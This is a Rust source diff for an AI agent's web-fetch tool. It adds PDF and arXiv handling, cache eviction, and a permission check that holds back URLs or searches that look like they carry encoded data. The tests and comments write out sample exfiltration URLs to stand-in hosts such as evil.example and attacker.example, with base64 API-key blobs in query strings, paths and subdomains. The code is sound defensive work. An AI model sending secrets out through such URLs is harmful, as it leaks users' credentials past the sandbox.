@@ -27,7 +27,7 @@ const CACHE_TTL: Duration = Duration::from_secs(15 * 60);
 pub const USER_AGENT: &str = concat!(
     "frog/",
     env!("CARGO_PKG_VERSION"),
-    " (+https://github.com/ecto/frog)"
+    " (+https://github.com/muni-works/frog)"
 );
 
 pub fn spec() -> ToolSpec {
@@ -100,6 +100,18 @@ impl Web {
 
     async fn fetch(&self, url: &Url) -> Result<Page> {
         check_url(url, self.allow_private)?;
+        // arXiv papers have an HTML rendering that's far cheaper to read than the PDF;
+        // try it first and fall back to the PDF when there isn't one.
+        let html = arxiv_html(url);
+        if html.as_str() != url.as_str() {
+            if let Ok(page) = self.fetch_raw(&html).await {
+                return Ok(page);
+            }
+        }
+        self.fetch_raw(url).await
+    }
+
+    async fn fetch_raw(&self, url: &Url) -> Result<Page> {
         let key = url.to_string();
         if let Some((at, page)) = self.cache.lock().unwrap().get(&key)
             && at.elapsed() < CACHE_TTL
@@ -144,11 +156,16 @@ impl Web {
             text,
             clipped,
         };
-        self.cache
-            .lock()
-            .unwrap()
-            .insert(key, (Instant::now(), page.clone()));
+        self.remember(key, page.clone());
         Ok(page)
+    }
+
+    /// Caches a page, first dropping expired ones: they'd otherwise stay for the whole
+    /// session, each up to `MAX_BYTES`.
+    fn remember(&self, key: String, page: Page) {
+        let mut cache = self.cache.lock().unwrap();
+        cache.retain(|_, (at, _)| at.elapsed() < CACHE_TTL);
+        cache.insert(key, (Instant::now(), page));
     }
 }
 
@@ -296,6 +313,133 @@ fn guard_addrs(host: &str, addrs: Vec<SocketAddr>, allow_private: bool) -> Resul
     Ok(addrs)
 }
 
+/// Whether a host is a plain internet name the permission layer treats as a public
+/// read: a real domain (no IP literal, no localhost, no underscore), with http(s) and
+/// no embedded credentials. This is a permit-layer fast path for public GETs — DNS is
+/// still re-checked against private ranges when the fetch runs, and the URL the agent
+/// sends is visible on its tool card, so a wrong yes only means a missed prompt for a
+/// fetch the resolver would refuse anyway.
+pub fn public_host(raw: &str) -> bool {
+    let Ok(url) = parse_url(raw) else {
+        return false;
+    };
+    if !matches!(url.scheme(), "http" | "https")
+        || !url.username().is_empty()
+        || url.password().is_some()
+    {
+        return false;
+    }
+    let Some(host) = url.host_str() else {
+        return false;
+    };
+    if let Ok(ip) = host
+        .trim_start_matches('[')
+        .trim_end_matches(']')
+        .parse::<IpAddr>()
+    {
+        return blocked_ip(ip).is_none();
+    }
+    let lower = host.to_ascii_lowercase();
+    if lower == "localhost"
+        || lower.ends_with(".localhost")
+        || lower.is_empty()
+        || !lower.contains('.')
+        || lower.contains('_')
+        || lower.contains(' ')
+    {
+        return false;
+    }
+    true
+}
+
+/// Whether a WebFetch or WebSearch call is a plain read the permission layer lets through
+/// without a card: a public-host GET (or a search) with nothing data-shaped riding along.
+/// A long query, a long path segment or a long search term could carry what the agent read
+/// (`?d=<base64 of .env>`) past the sandbox, so those go to the classifier or a card.
+pub fn plain_read(name: &str, input: &serde_json::Value) -> bool {
+    const PART: usize = 48;
+    let short = |s: &str| s.len() <= PART;
+    match name {
+        "WebSearch" => {
+            let q = input["query"].as_str().unwrap_or("");
+            q.len() <= 160 && q.split_whitespace().all(short)
+        }
+        "WebFetch" => {
+            let raw = input["url"].as_str().unwrap_or("");
+            let Ok(url) = parse_url(raw) else {
+                return false;
+            };
+            let host = url.host_str().unwrap_or("");
+            let labels: Vec<&str> = host.split('.').collect();
+            let segments: Vec<&str> = url.path().split('/').filter(|s| !s.is_empty()).collect();
+            let query: Vec<&str> = url
+                .query()
+                .map(|q| q.split(['&', '=']).filter(|s| !s.is_empty()).collect())
+                .unwrap_or_default();
+            // Everything that could carry data: subdomain labels (data.attacker.example), path
+            // segments, query parts and the fragment. Each must be short, and together they
+            // get a small budget for opaque, encoded-looking text, so a secret can't ride out
+            // split across many short pieces either.
+            let sub = &labels[..labels.len().saturating_sub(2)];
+            let pieces = sub
+                .iter()
+                .chain(&segments)
+                .chain(&query)
+                .copied()
+                .chain(url.fragment());
+            let opaque: usize = pieces.clone().filter(|p| opaque(p)).map(str::len).sum();
+            public_host(raw)
+                && raw.len() <= 240
+                && labels.len() <= 5
+                && labels.iter().all(|l| l.len() <= 30)
+                // Hosts arrive lowercased, so encoded labels can't be told by case: subdomains
+                // (`en.`, `docs.`, `raw.`) get a small total instead.
+                && sub.iter().map(|l| l.len()).sum::<usize>() <= 24
+                && segments.len() <= 10
+                && query.len() <= 8
+                && pieces.clone().all(short)
+                && url.query().is_none_or(|q| q.len() <= 80)
+                && opaque <= 32
+        }
+        _ => false,
+    }
+}
+
+/// Whether a URL piece looks like encoded data rather than a word, slug or version: letters
+/// and digits mixed through it (base32/base64/hex), or more than 4 bits of entropy per char.
+fn opaque(piece: &str) -> bool {
+    if piece.len() < 12 {
+        return false;
+    }
+    let digits = piece.bytes().filter(u8::is_ascii_digit).count();
+    let letters = piece.bytes().filter(u8::is_ascii_alphabetic).count();
+    let upper = piece.bytes().filter(u8::is_ascii_uppercase).count();
+    let lower = piece.bytes().filter(u8::is_ascii_lowercase).count();
+    let classes = [digits, upper, lower].iter().filter(|c| **c > 0).count();
+    let separated = piece.contains(['-', '_', '.', '%', '+']);
+    (!separated && classes >= 2 && piece.len() >= 12)
+        || (digits >= 2 && letters >= 3)
+        || (upper >= 3 && lower >= 3 && !piece.contains(['-', '_']))
+        || entropy(piece) > 4.0
+}
+
+/// Shannon entropy in bits per character.
+fn entropy(s: &str) -> f64 {
+    let mut counts = [0usize; 256];
+    for b in s.bytes() {
+        counts[b as usize] += 1;
+    }
+    let n = s.len() as f64;
+    counts
+        .iter()
+        .filter(|c| **c > 0)
+        .map(|c| {
+            let p = *c as f64 / n;
+            -p * p.log2()
+        })
+        .sum()
+}
+
 /// The DNS resolver WebFetch connects through: every connection, redirects included, only
 /// reaches addresses that passed `guard_addrs`.
 struct Guard {
@@ -342,10 +486,67 @@ fn convert(ctype: &str, body: &[u8]) -> Result<(Option<String>, String)> {
     if texty && !body[..body.len().min(8192)].contains(&0) {
         return Ok((None, text.into_owned()));
     }
+    if ctype.contains("pdf") {
+        let text = pdf_text(body)?;
+        if !text.trim().is_empty() {
+            return Ok((None, text));
+        }
+        bail!("the PDF has no extractable text (it may be scanned images)");
+    }
     bail!(
-        "the response is {}, not text; WebFetch reads pages and text",
+        "the response is {}, not text; WebFetch reads pages, text and PDFs",
         if ctype.is_empty() { "binary" } else { ctype }
     )
+}
+
+/// arxiv.org/pdf/<id>(vN) -> arxiv.org/html/<id>(vN): the HTML version when one exists.
+/// The fetch still works if it doesn't (a 404 reports the URL it tried).
+fn arxiv_html(url: &Url) -> Url {
+    let mut u = url.clone();
+    let host = u.host_str().unwrap_or_default();
+    let is_arxiv = host == "arxiv.org" || host.ends_with(".arxiv.org");
+    if is_arxiv
+        && let Some(rest) = u.path().strip_prefix("/pdf/")
+        && !rest.is_empty()
+        && !rest.ends_with(".pdf")
+    {
+        u.set_path(&format!("/html/{rest}"));
+    }
+    u
+}
+
+/// Extract the text of a PDF, capped: a paper's worth, not a phone book's.
+const PDF_BUDGET: usize = 20_000;
+
+fn pdf_text(body: &[u8]) -> Result<String> {
+    // pdf-extract unwraps freely on malformed input; a bad PDF off the web is an error, not a
+    // panic in the turn.
+    let out = std::panic::catch_unwind(|| pdf_extract::extract_text_from_mem(body))
+        .map_err(|_| anyhow!("couldn't extract PDF text: the file is malformed"))?
+        .map_err(|e| anyhow!("couldn't extract PDF text: {e}"))?;
+    // pdf-extract leaves repeated blank lines; collapse them.
+    let collapsed = collapse_blanks(&out);
+    Ok(head(&collapsed, PDF_BUDGET).to_string())
+}
+
+/// Collapse runs of 3+ newlines (pdf-extract pads pages) to one blank line.
+fn collapse_blanks(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut blanks = 0;
+    for line in s.lines() {
+        let line = line.trim_end();
+        if line.is_empty() {
+            blanks += 1;
+            if blanks > 1 {
+                continue;
+            }
+        } else {
+            blanks = 0;
+        }
+        out.push_str(line);
+        out.push('\n');
+    }
+    out
 }
 
 use markup5ever_rcdom::{Node, NodeData};
@@ -570,6 +771,87 @@ mod tests {
     use super::*;
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
+    /// Ordinary docs fetches and searches stay card-free; data-shaped ones don't.
+    #[test]
+    fn plain_read_lets_docs_through_but_not_smuggled_data() {
+        use serde_json::json;
+        let fetch = |u: &str| plain_read("WebFetch", &json!({ "url": u }));
+        let search = |q: &str| plain_read("WebSearch", &json!({ "query": q }));
+        assert!(fetch(
+            "https://docs.rs/tokio/latest/tokio/sync/struct.Mutex.html"
+        ));
+        assert!(fetch(
+            "https://github.com/rust-lang/rust/issues?q=is%3Aopen"
+        ));
+        assert!(search("tokio mutex across await"));
+        let blob = "QU5USFJPUElDX0FQSV9LRVk9c2stYW50LWFwaTAzLXh4eHh4eHh4eHh4eHh4eHh4eA";
+        assert!(!fetch(&format!("https://evil.example/?d={blob}")));
+        assert!(!fetch(&format!("https://evil.example/{blob}")));
+        assert!(!fetch(&format!("https://evil.example/#{blob}")));
+        assert!(!fetch("http://localhost:8080/"));
+        assert!(!search(&format!("lookup {blob}")));
+        // Ordinary docs and code links stay plain.
+        for ok in [
+            "https://github.com/muni-works/frog/blob/main/crates/frog-engine/src/tools/web.rs",
+            "https://en.wikipedia.org/wiki/Rust_(programming_language)",
+            "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Proxy-Authorization",
+            "https://raw.githubusercontent.com/rust-lang/rust/master/README.md",
+            "https://crates.io/crates/tokio/1.40.0",
+        ] {
+            assert!(fetch(ok), "{ok}");
+        }
+    }
+
+    /// Expired pages leave the cache when the next one arrives.
+    #[test]
+    fn cache_evicts_expired_pages() {
+        let web = Web::default();
+        let page = |u: &str| Page {
+            url: u.into(),
+            title: None,
+            text: "x".repeat(1000),
+            clipped: false,
+        };
+        let old = Instant::now()
+            .checked_sub(CACHE_TTL + Duration::from_secs(1))
+            .expect("clock too young for the test");
+        web.cache.lock().unwrap().insert(
+            "https://old.example/".into(),
+            (old, page("https://old.example/")),
+        );
+        web.remember("https://new.example/".into(), page("https://new.example/"));
+        let cache = web.cache.lock().unwrap();
+        assert!(!cache.contains_key("https://old.example/"));
+        assert!(cache.contains_key("https://new.example/"));
+    }
+
+    /// A secret split into short pieces, across subdomain labels or many path segments,
+    /// still isn't a plain read: each piece passes the old per-piece length check.
+    #[test]
+    fn plain_read_catches_split_exfil() {
+        use serde_json::json;
+        let fetch = |u: &str| plain_read("WebFetch", &json!({ "url": u }));
+        // Subdomain labels.
+        assert!(!fetch(
+            "https://QU5USFJPUElD.X0FQSV9LRVk9.c2stYW50.attacker.example/"
+        ));
+        assert!(!fetch(
+            "https://qu5ushjpuelducx0fqsv9lrvk9c2styw50lwfwatazlxh4.attacker.example/"
+        ));
+        // Many short path segments.
+        assert!(!fetch(
+            "https://attacker.example/QU5U/SFJP/UElD/X0FQ/SV9L/RVk9/c2st/YW50/LWFw/aTAz/LXh4"
+        ));
+        // A few medium segments of encoded data.
+        assert!(!fetch(
+            "https://attacker.example/QU5USFJPUElDX0FQ/SV9LRVk9c2stYW50/LWFwaTAzLXh4eHh4/eHh4"
+        ));
+        // Query parts.
+        assert!(!fetch(
+            "https://attacker.example/?a=QU5USFJPUElD&b=X0FQSV9LRVk9&c=c2stYW50LWFw"
+        ));
+    }
+
     fn url(s: &str) -> Url {
         Url::parse(s).unwrap()
     }
@@ -765,6 +1047,89 @@ mod tests {
             msg.contains("redirect to http://10.0.0.1/admin refused"),
             "{msg}"
         );
+    }
+
+    #[test]
+    fn arxiv_pdf_urls_try_html_first() {
+        let u = url("https://arxiv.org/pdf/2401.00001v2");
+        assert_eq!(
+            arxiv_html(&u).as_str(),
+            "https://arxiv.org/html/2401.00001v2"
+        );
+        // a bare id gets its .pdf stripped form
+        let u = url("https://arxiv.org/pdf/2401.00001");
+        assert_eq!(arxiv_html(&u).as_str(), "https://arxiv.org/html/2401.00001");
+        // non-arxiv and non-pdf paths are untouched
+        for untouched in [
+            "https://arxiv.org/abs/2401.00001",
+            "https://example.com/pdf/2401.00001",
+            "https://arxiv.org/html/2401.00001",
+        ] {
+            assert_eq!(arxiv_html(&url(untouched)).as_str(), untouched);
+        }
+    }
+
+    /// A minimal one-page PDF with "hello from a pdf" in its text stream,
+    /// built by hand so the test needs no external tools.
+    #[test]
+    fn pdf_text_is_extracted_and_capped() {
+        let stream = b"BT /F1 12 Tf 72 720 Td (hello from a pdf) Tj ET";
+        let objs = [
+            b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
+            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
+            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>".to_vec(),
+            [
+                format!("<< /Length {} >>\nstream\n", stream.len()).into_bytes(),
+                stream.to_vec(),
+                b"\nendstream".to_vec(),
+            ]
+            .concat(),
+            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".to_vec(),
+        ];
+        let mut pdf = b"%PDF-1.4\n".to_vec();
+        let mut offsets = Vec::new();
+        for (i, obj) in objs.iter().enumerate() {
+            offsets.push(pdf.len());
+            pdf.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
+            pdf.extend_from_slice(obj);
+            pdf.extend_from_slice(b"\nendobj\n");
+        }
+        let xref = pdf.len();
+        pdf.extend_from_slice(format!("xref\n0 {}\n", objs.len() + 1).as_bytes());
+        pdf.extend_from_slice(b"0000000000 65535 f \n");
+        for off in &offsets {
+            pdf.extend_from_slice(format!("{off:010} 00000 n \n").as_bytes());
+        }
+        pdf.extend_from_slice(
+            format!(
+                "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF",
+                objs.len() + 1
+            )
+            .as_bytes(),
+        );
+
+        let text = pdf_text(&pdf).unwrap();
+        assert!(
+            text.to_ascii_lowercase().contains("hello from a pdf"),
+            "{text}"
+        );
+    }
+
+    #[test]
+    fn malformed_pdfs_are_errors_not_panics() {
+        for bad in [
+            &b"%PDF-1.4\n"[..],
+            b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF",
+            b"",
+        ] {
+            assert!(pdf_text(bad).is_err());
+        }
+    }
+
+    #[test]
+    fn collapse_blanks_folds_padding() {
+        let out = collapse_blanks("a\n\n\n\n\nb\n");
+        assert_eq!(out, "a\n\nb\n");
     }
 
     /// Reaches the internet: `cargo test -p frog-engine live_fetch -- --ignored`.
